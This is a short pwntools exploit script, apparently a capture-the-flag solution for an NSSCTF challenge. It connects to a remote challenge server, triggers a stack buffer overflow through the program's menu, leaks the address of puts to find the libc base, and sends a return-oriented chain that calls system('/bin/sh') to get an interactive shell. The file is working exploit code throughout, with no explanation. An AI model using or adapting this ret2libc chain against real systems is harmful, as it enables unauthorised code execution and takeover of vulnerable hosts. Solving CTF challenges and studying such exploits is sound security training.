from pwn import *

#io = process("./attachment")
io = remote("node1.anna.nssctf.cn", 27235)
elf = ELF("./attachment")
libc = ELF("./libc.so.6")

context.log_level = "debug"

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

ret = 0x400579
pop_rdi = 0x400D73
main = 0x400cfa

def select(id: int):
    io.recvuntil(b"6.check youer money")
    io.sendline(str(id).encode())


def see_it(num: int):
    select(7)
    io.recvuntil(b"much do you exchange?")
    io.sendline(str(num).encode())


def hell_money(num: int):
    select(3)
    io.recvuntil(b"buying the hell_money?")
    io.sendline(str(num).encode())


def shop(payload: bytes):
    select(5)
    io.recvuntil(b"You can name it!!!")
    io.send(payload)


see_it(100000)
payload = b"a" * 0x40 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400b1e)
shop(payload)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.sym["puts"] 
print("libc base address =", hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = b"a" * 0x40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
